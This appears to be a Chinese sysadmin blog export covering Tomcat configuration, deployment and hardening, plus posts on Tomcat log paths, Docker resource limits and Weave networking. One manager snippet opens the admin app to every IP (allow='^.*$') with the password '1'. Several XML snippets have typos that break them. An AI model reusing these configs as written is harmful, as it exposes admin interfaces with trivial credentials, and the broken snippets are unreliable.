unpackWars 在启用此webapp时是否对WAR格式的归的文件先进行展开，默认为true。 虚拟主机定义示例 \u0026lt;Engine name='Catalina' defaultHost='localhost'\u0026gt;\r\u0026lt;Host name='localhost' appBase='webapps'\u0026gt;\r\u0026lt;Context path='' docBase='ROOT' /\u0026gt;\r\u0026lt;Context path='' docBase='/web/www' reloadable='true' crossContext='true' /\u0026gt;\r\u0026lt;/Host\u0026gt;\r\u0026lt;/Engine\u0026gt;\r主机别名定义 \u0026lt;Host name='localhost' appBase='webapps'\u0026gt;\r\u0026lt;Alias\u0026gt;web.com\u0026lt;/Alias\u0026gt;\r\u0026lt;/Host\u0026gt;\r上下文(Context) Context组件是 最内层次的组件，它表示Web应用程序本身。配置一个Context最主要的是指定Web应用程序的根目录，以便Servlet容器能够将用户请求发往正确的位置。Context组件也可包含自定义的错误页，以实现在用户访问发生错误时提供友好的提示信息。 context在某些意义上类似于apache中的路径别名，一个Context定义用于表示tomcat实例中的一个Web应用程序。\n\u0026lt;Context path=\u0026quot;/web/bbs\u0026quot; docBase=\u0026quot;/data/web\u0026quot; /\u0026gt;\r在tomcat6中每一个context定义也可以使用一个单独的XML文件进行，其文件的目录为$CATALINA_HOME/conf/\u0026lt;engine name\u0026gt;/\u0026lt;host name\u0026gt;，可以用于Context中的XML元素有Loader，Manager，Realm，Resources、WatchedResource。\n属性 说明 docBase 相应的web应用程序的存放位置。也可以使用相对路径，起始路径为此Context所属Host中appBase定义的路径。切记，docBase的路径名不能与相应host中appBase中定义的路径名有包含关系。如：如果appBase为deploy，而docBase决不能为deploy-bbs之类的名字。 path 相对与web服务器根路径而言的URI，如果为空\u0026rsquo;\u0026rsquo;，则表示为此webapp的根路径，如果context定义在一个单独的xml文件中，此属性不需要定义。 reloadable 是够允许重新加载此context相关的web应用程序的类，默认为false 被嵌套类(nested)组件 这类组件通常包含于容器类组件中以提供具有管理功能的服务，它们不能包含其它组件，但有些却可以由不同层次的容器各自配置。\n阀门(Valve) 用来拦截请求并在将其转至目标之前进行某种处理操作，类似于Servlet规范中定义的过滤器。Valve可以定义在任何容器类的组件中。Valve常被用来记录客户端请求、客户端IP地址和服务器等信息，这种处理技术通常被称作请求转储(request dumping)。请求转储valve记录请求客户端请求数据包中的HTTP首部信息和cookie信息文件中，响应转储valve则记录响应数据包首部信息和cookie信息至文件中。\nValve（阀门）类似于过滤器，用来拦截请求并在将其转至目标之前进行某种处理操作；它可以工作于Engine和Host/Context之间、Host和Context之间以及Context和Web应用程序的某资源之间。 Valve常被用来记录客户端请求、客户端IP地址和服务器等信息，这种处理技术通常被称作请求转储(request dumping)。请求转储valve记录请求客户端请求数据包中的HTTP首部信息和cookie信息文件中，响应转储valve则记录响应数据包首部信息和cookie信息至文件中。\n一个容器内可以建立多个Valve，而且Valve定义的次序也决定了它们生效的次序。不同类型的Value具有不同的处理能力，Tomcat中实现了多种不同的Valve：\nAccessLogValve：访问日志Valve。 ExtendedAccessValve：扩展功能的访问日志Valve。 JDBCAccessLogValve：通过JDBC将访问日志信息发送到数据库中。 RequestDumperValve：请求转储Valve。 RemoteAddrValve：基于远程地址的访问控制。 RemoteHostValve：基于远程主机名称的访问控制。 SemaphoreValve：用于控制Tomcat主机上任何容器上的并发访问数量。 JvmRouteBinderValve：在配置多个tomcat为以Apache通过mod_proxy或mod_jk作为前段的集群架构中，当期望停止某节点时，可以通过此valve将用记请求定向至备用节点，使用civalve必须使 JvmRouteSessionIDBinderListener。 ReplicationValve：专用于Tomcat集群架构中，可以在某个请求的session信息发生更改时触发session数据在各节点间进行复制。 SingleSignOn：将两个或多个需要对用户进行认证webapp在认证用户时连接在一起，即一次认证即可访问所有连接在一起的webapp。 ClusterSingleSingOn：对SingleSignOn的扩展，专用于Tomcat集群当中，需要结合ClusterSingleSignOnListener进行工作。 RemoteHostValve和RemoteAddrValve可以分别用来实现基于主机名称和基于IP地址的访问控制，控制本身可以通过allow或deny来进行定义，这有点类似与Apache httpd的访问控制功能：如下面的valve则实现了仅允许本机访问/probe。 \u0026lt;Context path='/porbe' docBase='probe'\u0026gt;\r\u0026lt;Valve className='org.apache.catalina.valves.RemoteAddrValve' allow=\u0026quot;127\\.0\\.0\\.1\u0026quot; /\u0026gt;\r\u0026lt;/Context\u0026gt;\r常用相关属性说明 属性 说明 className 相关的java实现的类名，相应于分别应该为org.apache.catalina.valves.RemoteAddrValve allow 以逗号分开的允许访问的IP地址列表，支持正则表达式，因此。点号“.”用于IP地址时需要转义，仅定义allow项时，非明企鹅allow的地址均被deny。 deny 以逗号分开的禁止访问的IP地址列表，支持正则表达式。 日志记录器(Logger) 用于记录组件内部的状态信息，可被用于除Context之外的任何容器中。日志记录的功能可被继承，因此，一个引擎级别的Logger将会记录引擎内部所有组件相关的信息，除非某内部组件定义了自己的Logger组件。\n领域(Realm) Realm（领域）表示分配给这些用户的用户名，密码和角色（类似于Unix组）的\u0026quot;数据库\u0026quot;。一个Realm（领域）表示一个安全上下文，它是一个授权访问某个给定Context的用户列表和某用户所允许切换的角色相关定义的列表。因此Realm就像是一个用户和组相关的数据库。定义Realm是唯一必须要提供的是classname，它是Realm的国歌 LockOutRealm：提供锁定功能，以便在给定时间段内出现过多的失败认证尝试时提供用户锁定机制；\nJAASRealm：基于Java Authintication and Authorization Service实现用户认证。 JDBCRealm：通过JDBC访问某关系型数据库表实现用户认证。 JNDIRealm：基于JNDI使用目录服务实现认证信息的获取。 MemoryRealm：超找tomcat-user.xml文件实现用户信息的获取。 UserDatabaseRealm：基于UserDatabase文件(通常是tomcat-user.xml)实现用户认证，它实现是一 完全可更新和持久有效的MemoryRealm，因此能够跟标准的MemoryRealm兼容；它通过JNDI实现； 使用JDBC方式获取用户认证信息的配置 \u0026lt;Ream className=\u0026quot;org.apache.catalina.realm.UserDatabaseRealm\u0026quot; resourceName=\u0026quot;UserDatabase\u0026quot; /\u0026gt;\r\u0026lt;!-- 使用UserDatabase的配置 --\u0026gt;\r\u0026lt;Ream className=\u0026quot;org.apache.catalina.realm.UserDatabaseRealm\u0026quot; debug=\u0026quot;99\u0026quot;\rdriverName=\u0026quot;org.gjt.mm.mysql.Driver\u0026quot;\rconnectionUrl=\u0026quot;jdbc:mysql//localhost/authority\u0026quot;\ruserTable=\u0026quot;test\u0026quot; userNameCol=\u0026quot;user_name\u0026quot;\ruserCredCol=\u0026quot;user_pass\u0026quot;\ruserRoleTable=\u0026quot;user_roles\u0026quot; roleNameCol=\u0026quot;role_name\u0026quot; /\u0026gt;\rtomcat的运行模式 standalone 通过内置的web server(http connector)来接受客户端请求；\nproxy 由专门的web server服务客户端的http请求；\nin-process：不属于同一主机；\nnetwork：不属于不同主机\n每一次访问jsp文件时，jsp文件会被编译成字节码存放到磁盘，下次访问时直接加载字节码不会再访问了。\nserver.xml：主配置文件\ncontext.xml：每个webapp都可以有专用的配置文件，这些配置文件通常位于webapp应用程序目录下的WEB-INF目录中，用于定义会话管理器、JDBC等：conf/context.xml是为各webapp提供默认部署相关的配置；\ntomcat-user.xml用户认证的账号和密码配置文件。\ncatalina.policy：当使用-security选项启动tomcat实例时，会读取此配置文件来实现其安全运行策略；\ncatalina.properties：java属性的定义文件，用于设定类加载器路径等，以及一些JVM性能相关的调优参数；\nlogging.properties：日志相关的配置信息；\nTomcat连接器架构 基于Apache做为Tomcat前端的架构来讲，Apache通过mod_jk、mod_jk2或mod_proxy模块与后端的Tomcat进行数据交换。而对Tomcat来说，每个Web容器实例都有一个Java语言开发的连接器模块组件，在Tomcat6中，这个连接器是org.apache.catalina.Connector类。这个类的构造器可以构造两种类别的连接器：HTTP/1.1负责响应基于HTTP/HTTPS协议的请求，AJP/1.3负责响应基于AJP的请求。但可以简单地通过在server.xml配置文件中实现连接器的创建，但创建时所使用的类根据系统是支持APR(Apache Portable Runtime)而有所不同。\nAPR是附加在提供了通用和标准API的操作系统之上一个通讯层的本地库的集合，它能够为使用了APR的应用程序在与Apache通信时提供较好伸缩能力时带去平衡效用。\n同时，需要说明的是，mod_jk2模块目前已经不再被支持了，mod_jk模块目前还apache被支持，但其项目活跃度已经大大降低。因此，目前更常用 的方式是使用mod_proxy模块。\n如果支持APR：\nHTTP/1.1：org.apache.cotote.http11.Http11AprProtocol\rAJP/1.3：org.apache.coyote.ajp.AjpAprProtocol\r如果不支持APR：\nHTTP/1.1: org.apache.coyote.http11.Http11Protocol\rAJP/1.3: org.apache.jk.server.JkCoyoteHandler\r连接器协议：\nTomcat的Web服务器连接器支持两种协议：AJP和HTTP，它们均定义了以二进制格式在Web服务器和Tomcat之间进行数据传输，并提供相应的控制命令。\nAJP(Apache JServ Protocol)协议：目前正在使用的AJP协议的版本是通过JK和JK2连接器提供支持的AJP13，它基于二进制的格式在Web服务器和Tomcat之间传输数据，而此前的版本AJP10和AJP11则使用文本格式传输数据。\nHTTP协议：诚如其名称所表示，其是使用HTTP或HTTPS协议在Web服务器和Tomcat之间建立通信，此时，Tomcat就是一个完全功能的HTTP服务器，它需要监听在某端口上以接收来自于商前服务器的请求。\n下载安装tomcat Tomcat的官方站点\nhttp://tomcat.apache.org/\n要安装Tomcat，首先需要安装JDK。\njdk下载地址\nhttp://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\n加载环境变量\ncat \u0026gt;/etc/profile.d/java.sh \u0026lt;\u0026lt;EOF\rJAVA_HOME=/app/jdk\rexport PATH=$JAVA_HOME/bin:$PATH\rEOF\r查看java版本\n$ java -version\rjava version \u0026quot;1.8.0_144\u0026quot;\rJava(TM) SE Runtime Environment (build 1.8.0_144-b01)\rJava HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode)\ryum安装jdk 此方法不需要对path设置\nyum install java-1.8.0-openjdk* -y\r部署tomcat 官方网站：http://tomcat.apache.org/\n$ tree /app/tomcat-8.5.16/ -L 1\r/app/tomcat-8.5.16/\r├── bin\r├── conf\r├── lib\r├── LICENSE\r├── logs\r├── NOTICE\r├── RELEASE-NOTES\r├── RUNNING.txt\r├── temp\r├── webapps\r└── work\r/app/tomcat-8.5.16/bin/startup.sh tomcat配置 tomcat的目录结构 bin：脚本及启动时用到的类\nlib：类库\nconf：配置文件\nlogs：日志文件\nwebapps：应用程序默认部署目录\nwork：工作目录\ntemp：临时文件目录\n$ tree -L 1 /app/tomcat/\r/app/tomcat/\r├── bin #\u0026lt;==脚本及启动时用到的类\r├── conf #\u0026lt;==配置文件\r│ ├── Catalina\r│ ├── catalina.policy\r│ ├── catalina.properties #\u0026lt;==当使用-security选项启动tomcat实例时，会读取此配置文件来实现其安全运行策略；\r│ ├── context.xml #\u0026lt;== 每个webapp都可以有专用的配置文件，这些配置文件通常位于webapp应用程序目录下的WEB-INF目录中，用于定义会话管理器、JDBC等：conf/context.xml是为各webapp提供默认部署相关的配置\r│ ├── logging.properties #\u0026lt;==日志相关的配置信息；\r│ ├── server.xml #\u0026lt;==主配置文件\r│ ├── tomcat-users.xml #\u0026lt;==用户认证的账号和密码配置文件\r│ └── web.xml\r├── lib #\u0026lt;==类库\r├── logs #\u0026lt;==日志文件\r├── temp #\u0026lt;==临时文件目录\r├── webapps #\u0026lt;==应用程序默认部署目录\r└── work #\u0026lt;==工作目录\rjava webapp组织结构 有特定的组织形式、层次型的目录结构：主要包含了servlet代码文件、JSP页面文件、类文件、部署描述符文件等；\n/usr/local/tomcat/webapps/app1/\n/webapp的根目录\nWEB-INF：当前webapp的私有资源目录，通常存放当前webapp自用的 web.xml\nMETA-INF：当前webapp的私有资源目录，通常存放当前webapp自用的 context.xml\nclasses：此webapp的私有类\nlib：此webapp的私有类，被大包围jar格式类。\nindex.jsp：webapp的主页\nwebapp归档格式：\n.war：webapp .jar：EJB的类 .rar：资源适配器 .ear：企业级应用程序 手动部署java程序 在webapp下创建特定格式的子目录。每个应用程序都会自动从tomcat conf目录下去读取web.xml和context.xml。如果没有提供默认的，就会从tomcat上继承一个公共的。如想对默认配置进行修改，建议复制web.xml到WEB-INF，context.xml到MATE-INF下修改专有配置。不会对全局进行影响。\nmkdir -pv app/{lib,classes,WEB-INF,META-INF}\r\u0026lt;%@ page language=\u0026quot;java\u0026quot; %\u0026gt;\r\u0026lt;%@ page import=\u0026quot;java.util.*\u0026quot; %\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;JSP Test Page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\u0026lt;% out.println(\u0026quot;Hellow, world.\u0026quot;); %\u0026gt;\u0026lt;/body\u0026gt;\r\u0026lt;html\u0026gt;\rjava程序在运行时，index.jsp文档首先会被转为java文件。最后编译成class文件。这些编译结果会保存在java（tomcat）当中的work子目录。\n为了能使每一个类都是全局唯一的，所以每个公司所开发的java类（可能被公共调用的），都以自己公司的域名倒过来写 org.apache.jsp。\n$ tree /app/tomcat/work/\r/app/tomcat/work/\r└── Catalina\r└── localhost\r├── app\r│ └── org\r│ └── apache\r│ └── jsp │ ├── index_jsp.class #\u0026lt;==最终被编译成java类，最终运行的\r│ └── index_jsp.java #\u0026lt;==这是servlet文件，纯java编码\r└── ROOT\r└── org\r└── apache\r└── jsp\r├── index_jsp.class\r└── index_jsp.jav\r部署 部署(deployment) webapp相关的操作：\ndeploy:部署，将webapp的源文件放置于目标目录、配置tomcat服务器能够基于context.xml文件中定义的路径来访问此webapp；将其特有类通过class loader装载至tomcat\ntomcat部署的两种方式\n自动部署autodeploy 手动部署 冷部署：把webapp复制到指定位置，而后才启动tomcat。\n热部署：在不停止tomcat的前提下进行的部分。需要通过部署工具来进行。常见的部署工具有 manager、ant脚本、tcd（tomcat client deployer）等。\nundeploy：反部署，停止webapp，并从tomcat实例拆除其部分文件和部署名。\nstop：停止，不再想用户提供服务。\nstart：启动处于“停止”状态的webapp\nredeploy：重新部署\ntomcat安全规范 telnet管理端口保护 修改默认的8005管理端口不易猜疑的端口（大于1024）或改为-1关闭端口。\n修改SHUTDOWN指令为其他字符串\n\u0026lt;Server port='-1' shutdown='SHUTDOWN'\u0026gt;\rAJP连接端口保护 1、修改默认的ajp 8009端口为不易冲突的大于1024端口。\n2、通过iptables规则限制ajp端口访问的权限仅为线上机器。保护此端口的目的在于防止线下测试流量被mod_jk转发至线上tomcat服务器\n\u0026lt;Connector port=\u0026quot;8528\u0026quot; protocol=\u0026quot;AJP/1.3\u0026quot; /\u0026gt;\r禁用管理端 删除默认的tomcat安装目录 /conf/tomcat-user.xml文件。重启tomcat后将会自动生成新的文件。 删除tomcat目录webapps下默认的所有目录和文件 将tomcat应用根目录配置为tomcat安装目录以外的目录。 降权启动 tomcat启动用户权限必须为非root权限，尽量降低tomcat启动用户的目录访问权限；如果直接对外使用80端口，可通过普通账号启动后配置iptables规则进行转发。避免一旦tomcat服务被入侵，黑客直接获取高级用户权限危害整个server的安全。\n版本信息隐藏 修改 conf/web.xml，重定向403 404及500等错误指定的错误页面。 可以通过修改应用程序目录下的 WEB-INF/web.xml 下的配置进行错误页面的重定向。 \u0026lt;error-page\u0026gt;\r\u0026lt;error-code\u0026gt;403\u0026lt;/error-code\u0026gt;\r\u0026lt;location\u0026gt;/forbidden.jsp\u0026lt;/location\u0026gt;\r\u0026lt;/error-page\u0026gt;\r\u0026lt;error-page\u0026gt;\r\u0026lt;error-code\u0026gt;404\u0026lt;/error-code\u0026gt;\r\u0026lt;location\u0026gt;/notfound.jsp\u0026lt;/location\u0026gt;\r\u0026lt;/error-page\u0026gt;\r\u0026lt;error-page\u0026gt;\r\u0026lt;error-code\u0026gt;500\u0026lt;/error-code\u0026gt;\r\u0026lt;location\u0026gt;/systembusy.jsp\u0026lt;/location\u0026gt;\r\u0026lt;/error-page\u0026gt;\r在配置中对一些常见错误进行重定向，避免当出现错误时tomcat默认显示的错误页面暴露服务器和版本信息，必须确保程序很目录下的错误页面已经存在。\nserver header重写 在HTTP Connector配置中加入server的配置 server=\u0026quot;webserver\u0026quot; 。当tomcat HTTP端口直接提供web服务时此配置生效，加入此配置，将会替换http响应Server header部分的默认配配置，默认是 Apache-Coyote/1.1\n访问限制 通过配置限定访问的IP来源。配置信任IP的白名单，拒绝非白名单ip的访间。此配置主要是针对高 保密级别的系统。一般产品线不需要。\n\u0026lt;Context path=\u0026quot;\u0026quot; docBasse=\u0026quot;/home/work/tomcat\u0026quot; debug=\u0026quot;0\u0026quot; reloadable=\u0026quot;false\u0026quot; crossContext=\u0026quot;true\u0026quot;\u0026gt;\r\u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.RemoteAddrValue\u0026quot; allow=\u0026quot;10.0.0.2,10.0.0.3\u0026quot; deny=\u0026quot;*.*.*.*\u0026quot; /\u0026gt;\r\u0026lt;/Context\u0026gt;\r启动停止脚本权限回收 去除其他用户对tomcat的bin目录下 shutdown.sh、startup.sh、catalina.sh 的可执行权限。防止其他用户有上线的其他权限。\nchmod -R 744 /app/tomcat/bin/*\r访问日志规范格式 开启tomcat默认访间日志中的Referer和User-Agent记录\n\u0026lt;Valve className=\u0026quot;org.apache.catalina.valvesAccessLogValve\u0026quot; directory=\u0026quot;logs\u0026quot;\rprefix=\u0026quot;localhost_access_log.\u0026quot; suffix=\u0026quot;.txt\u0026quot;\rpattern=\u0026quot;%h %l %u %t %r %s %b %(Referer}i %{User-Agent)i %D\u0026quot; resolveHosts=\u0026quot;false\u0026quot; /\u0026gt;\r文件列表访问控制 $CATALINA_HOME/conf/web.xml或WEB-INF/web.xml 文件中default部分 listings 的配置必须为 ==false==。false为不列出目录列表，true为列出。默认false。\n\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt; tomcat 应用程序 manager app webapp管理工具\nmanager配置 首先编辑/app/tomcat/conf/tomcat-users.xml文件，改完后不会立即生效，tomcat在启动时，将读取配置文件到内存中。需要重读授权表或重启。\n\u0026lt;role rolename=\u0026quot;manager-gui\u0026quot;/\u0026gt;\r\u0026lt;user username=\u0026quot;admin\u0026quot; password=\u0026quot;1\u0026quot; roles=\u0026quot;manager-gui\u0026quot; /\u0026gt;\r⚠ 请注意，对于Tomcat manager而言，需要分配您希望访问的功能所需的角色。 manager-gui：允许访问HTML GUI和状态页面（图形接口）\nmanager-script：允许访问文本界面和状态页面（命令行接口）\nmanager-jmx：允许访问JMX代理和状态页面（JMX用来远程监控java程序的监控接口）\nmanager-status：仅允许访问状态页面（JAVA虚拟机各种状态信息。只读，无法进行管理）\ntomcat8 403 \u0026lt;Context privileged=\u0026quot;true\u0026quot; antiResourceLocking=\u0026quot;false\u0026quot;\rdocBase=\u0026quot;${catalina.home}/webapps/manager\u0026quot;\u0026gt;\r\u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.RemoteAddrValve\u0026quot; allow=\u0026quot;^.*$\u0026quot; \\/\u0026gt;\r\u0026lt;/Context\u0026gt;\rhost manager Virtual Hosts管理工具\n44 \u0026lt;role rolename=\u0026quot;manager-gui\u0026quot;/\u0026gt;\r45 \u0026lt;role rolename=\u0026quot;admin-gui\u0026quot; /\u0026gt;\r46 \u0026lt;user username=\u0026quot;admin\u0026quot; password=\u0026quot;1\u0026quot; roles=\u0026quot;manager-gui,admin-gui\u0026quot;/\u0026gt;\rtomcat8 403 \u0026lt;Context antiResourceLocking=\u0026quot;false\u0026quot; privileged=\u0026quot;true\u0026quot; \u0026gt;\r\u0026lt;Valve className=\u0026quot;org.apache.catalina.valves.RemoteAddrValve\u0026quot; allow=\u0026quot;10.0.0.*\u0026quot; /\u0026gt;\r\u0026lt;Manager sessionAttributeValueClassNameFilter=\u0026quot;java\\.lang\\. (?:Boolean|Integer|Long|Number|String)|org\\.apache\\.catalina\\.filters\\.CsrfPreventionFilter\\$LruCache(?:\\$1)?|java\\.util\\.(?:Linked)?HashMap\u0026quot;/\u0026gt;\r\u0026lt;/Context\u0026gt;\rServer Status manager子组件\napache反向代理tomcat lamt client \u0026ndash;\u0026gt; http \u0026ndash;\u0026gt; httpd \u0026ndash;\u0026gt; reverse_proxy \u0026ndash;\u0026gt; http ajp \u0026ndash;\u0026gt; tomcat {http connector ajp connector}\nhttpd反代模块\n主：proxy_module 子：proxy_module_http proxy_module_ajp。 \u0026lt;VirtualHost *:80\u0026gt;\rDocumentRoot \u0026quot;/app/apache-2.4.28/docs/www\u0026quot;\rServerName www.test.com\rServerAlias test.com\rErrorLog \u0026quot;logs/www.com-error_log\u0026quot;\rCustomLog \u0026quot;logs/www.com-access_log\u0026quot; common\rProxyVia On\rProxyRequests Off\rProxyPreserveHost On\r\u0026lt;Proxy *\u0026gt;\rrequire all granted\r\u0026lt;/Proxy\u0026gt;\rProxyPass / http://10.0.0.5:8080/\rProxyPassReverse / http://10.0.0.5:8080/\r\u0026lt;/VirtualHost\u0026gt;\rajp\n\u0026lt;VirtualHost *:80\u0026gt;\rDocumentRoot \u0026quot;/app/apache-2.4.28/docs/www\u0026quot;\rServerName www.test.com\rServerAlias test.com\rErrorLog \u0026quot;logs/www.com-error_log\u0026quot;\rCustomLog \u0026quot;logs/www.com-access_log\u0026quot; common\rProxyVia On\rProxyRequests Off\rProxyPreserveHost On\r\u0026lt;Proxy *\u0026gt;\rrequire all granted\r\u0026lt;/Proxy\u0026gt;\rProxyPass /index.php !\rProxyPass / ajp://10.0.0.5:8009/\rProxyPassReverse / ajp://10.0.0.5:8009/\r\u0026lt;/VirtualHost\u0026gt;\r","permalink":"https://www.oomkill.com/2018/06/tomcat/","summary":"","title":"tomcat使用"},{"content":"修改logging.properties /usr/local/apache-tomcat-8.5.32/conf/logging.properties\r############################################################\r# Handler specific properties.\r# Describes specific configuration info for Handlers.\r############################################################\r1catalina.org.apache.juli.AsyncFileHandler.level = FINE\r1catalina.org.apache.juli.AsyncFileHandler.directory = /data/logs\r1catalina.org.apache.juli.AsyncFileHandler.prefix = catalina.\r2localhost.org.apache.juli.AsyncFileHandler.level = FINE\r2localhost.org.apache.juli.AsyncFileHandler.directory = /data/logs\r2localhost.org.apache.juli.AsyncFileHandler.prefix = localhost.\r3manager.org.apache.juli.AsyncFileHandler.level = FINE\r3manager.org.apache.juli.AsyncFileHandler.directory = /data/logs\r3manager.org.apache.juli.AsyncFileHandler.prefix = manager.\r4host-manager.org.apache.juli.AsyncFileHandler.level = FINE\r4host-manager.org.apache.juli.AsyncFileHandler.directory = /data/logs\r4host-manager.org.apache.juli.AsyncFileHandler.prefix = host-manager.\rjava.util.logging.ConsoleHandler.level = FINE\rjava.util.logging.ConsoleHandler.formatter = org.apache.juli.OneLineFormatter\r替换命令\n:%s#${catalina.base}/logs#/data/logs#g\rsed -i s#${catalina.base}/logs#/data/logs#g /usr/local/apache-tomcat-8.5.32/conf/logging.properties\r修改catalina.sh CATALINA_OUT=/data/logs/catalina.out\rJAVA_HOME=/usr/java/latest\rJAVA_OPTS=\u0026quot;${JAVA_OPTS} -Xms4096m -Xmx4096m -Xmn1024m -Xss1024K -XX:PermSize=4096m -XX:MaxPermSize=4096m\u0026quot;\r增加如下：\nCATALINA_OUT=/data/logs/catalina.out\rorg.apache.catalina.startup.Bootstrap \u0026quot;$@\u0026quot; start 2\u0026gt;\u0026amp;1 \\\r| /usr/sbin/cronolog /data/logs/catalina.%Y-%m-%d.out \u0026gt;\u0026gt; /dev/null \u0026amp;\r","permalink":"https://www.oomkill.com/2018/06/tomcat-log-path/","summary":"","title":"tomcat修改日志目录"},{"content":"默认情况下，容器没有任何资源限制，因此几乎耗尽docker主机之上，内核可分配给当前容器的所有资源。可以使用主机内核调度程序允许的尽可能多的给定资源。在此基础上Docker provides提供了控制容器可以使用多少内存，CPU或块IO的方法，设置docker run命令的运行时配置标志。\n容器得以实现主要依赖于内核中的两个属性namespace cgroup。其中许多功能都要求您的内核支持Linux功能。要检查支持，可以使用docker info命令。\nMemory OOME\n在Linux主机上，如果内核检测到没有足够的内存来执行重要的系统功能，它会抛出OOME或Out of Memory Exception异常，并开始终止进程以释放内存资源。一旦发生OOME，任何进程都有可能被杀死，包括docker daemon自身在内。为此，Docker特地调整了docker daemon的OOM优选级，以免它被内核“正法”，但容器的优选级并未被调整。\n工作逻辑为\n在宿主机上跑有很多容器并包括系统级进程。系统级进程也包括docke daemon自身。当内核执行系统管理操作，如内核需要使用内存，发现可以内存已经为空，会启动评估操作，评估谁占用内存高。我们认为哪个资源占用内存高就该将其kill来释放内存空间。（需要注意的是占用内存高的进程也不一定被kill掉。A进程分配10G已使用5G，进程B分配1G已使用1G。A只使用50%内存，而B已经耗尽所有内存）。内核会提供这些进程进行评分，按照优先级逆序强制kill，直至可使用内存空间足够。此时内核就可以使用内存资源创建其他进程。\n每一个进程被计算之后会有一个oom scores，得分越高就会被优先kill。得分是由内存申请分配空间等一系列复杂计算得知。当进程得分最高也不能被kill掉时，如docker daemon，此时需要调整优先级。每一个进程有一个oom.adj的参数，将优先级调整越低，计算的分数就越少。\n在docker run时可以直接调整容器的OOM.adj参数。如果想限制容器能使用多少内存资源、或CPU资源，有专门的选项可以实现。非常重要的容器化应用需要在启动容器时调整其OOM.adj，还可以定义容器的策略，一旦被kill直接restart\nLimit a container\u0026rsquo;s resources\n限制一个容器能使用多少内存资源或CPU资源docker有专门的选项来实现\n-m 限制容器可用RAM空间。选项参数可以使用KB M G等作为接受单位使用。可单独使用。\n--memory-swap 设置容器可用交换分区大小。使用swap允许容器在容器耗尽可用的所有RAM时将多余的内存需求写入磁盘。--memory-swap是一个修饰符标志，只有在设置了\u0026ndash;memorys时才有意义。\n--memory-swap\n--memory-swap --memory 功能 正数S 正数 M 容器可用总空间为S，其中可用ram为M 0 正数 M相当于未设置swap（unset） unset（未设置） 正数 M 若主机（Docker Host）启用了swap，则容器的可用swap为 2*M -1 正数M 若主机（Docker Host）启用了swap，则容器可使用交换分区总空间大小为宿主机上的所有swap空间的swap资源 注意：在容器内使用free命令可以看到的swap空间并不具有其所展现出的空间指示意义。 \u0026ndash;memory-swappiness\n用来限定容器使用交换分区的倾向性。\n\u0026ndash;memory-reservation\n预留的内存空间\n\u0026ndash;oom-kill-disable\n禁止oom被kill掉\n默认情况下，每个容器对主机CPU周期的访问权限是不受限制的。可以设置各种约束来限制给定容器访问主机的CPU周期。大多数用户使用和配置默认CFS调度程序。在Docker 1.13及更高版本中，还可以配置实时调度程序。 CPU Limit a container\u0026rsquo;s resources\n内核中进程管理子系统当中最重要的组件为进程角度器scheduler，非实时优先级,有效范围为100-139[-20,19]。因此每个进程的默认优先级为120。实时优先级0-99。调度100-139之间的进程有个非常重要的调度器CFS scheduler（完全公平调度器），公平调度每一个进程在需要执行时，去分配scores到这个进程上。\n在各容器之间分配CPU资源选项：\n参数 说明 \u0026ndash;cpu-shares 限制CPU使用个数的参数按比例切分当前系统上可用cpu资源。\n例如：当前系统上运行2各容器，第一个为1024，第二个为512。这两个容器都尽可能多个使用CPU，会将CPU资源分3份，1024占2份，第二个容器占1份。可随时按比例调整CPU资源。 \u0026ndash;cups 指定容器可以使用的可用CPU资源量。例如，如果主机有两个CPU并且已设置\u0026ndash;cpus=\u0026ldquo;1.5\u0026rdquo;，则容器最多保证1.5个CPU。例如：4核CPU，4个使用总量为1.5而不是0使用100%，1使用50%。 \u0026ndash;cpuset-cpus 限制CPU使用范围的参数。限制容器可以使用的特定CPU或核心。当有多个CPU，则容器可以使用的以逗号分隔的列表或连字符分隔的CPU范围。第一个CPU编号为0.有效值可能是0-3 1,3使用第二个和第四个CPU。 docker pull lorel/docker-stress-ng\n","permalink":"https://www.oomkill.com/2018/06/container-limit/","summary":"","title":"容器的资源限制"},{"content":"项目地址：https://github.com/weaveworks/weave\n注：weave公司与2024年关门\nweaves说明 Weave是由weaveworks公司开发的解决Docker跨主机网络的解决方案，它能够创建一个虚拟网络，用于连接部署在多台主机上的Docker容器，这样容器就像被接入了同一个网络交换机，那些使用网络的应用程序不必去配置端口映射和链接等信息。\n外部设备能够访问Weave网络上的应用程序容器所提供的服务，同时已有的内部系统也能够暴露到应用程序容器上。Weave能够穿透防火墙并运行在部分连接的网络上，另外，Weave的通信支持加密，所以用户可以从一个不受信任的网络连接到主机。\nweaves实现原理 weave launch初始化时会自动下载三个docker容器来辅助运行，并且创建linux网桥与docker网络\nweave 运行了三个容器：\nweave 是主程序，负责建立weave网络，收发数据，提供 DNS 服务等。 weavevolumes容器提供卷存储 weavedb容器提供数据存储 $ docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rweaveworks/weavedb latest 15c78a9b1895 4 weeks ago 698B\rweaveworks/weaveexec 2.4.0 bf0c403ea58d 4 weeks ago 151MB\rweaveworks/weave 2.4.0 7aa67bc6bc43 4 weeks ago 96.7MB\r自动创建网桥\n$ brctl show\rbridge name\tbridge id\tSTP enabled\tinterfaces\rdocker0\t8000.02426cf29450\tno\tdocker_gwbridge\t8000.02420cb2e439\tno\tweave\t8000.a2ec14f583ef\tno\tvethwe-bridge\rdatapath：是一个openvswitch vethwe-datapath@vethwe-bridge：是veth pair vethwe-datapath：父设备是datapath vxlan-6784：是vxlan interface，其maste也是datapath，weave主机之间通过Vxlan节能型通信 $ ifconfig\rdatapath: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1376\rinet6 fe80::e45d:12ff:fee2:9d69 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether e6:5d:12:e2:9d:69 txqueuelen 1000 (Ethernet)\rRX packets 19 bytes 1060 (1.0 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 8 bytes 648 (648.0 B)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rdocker0: 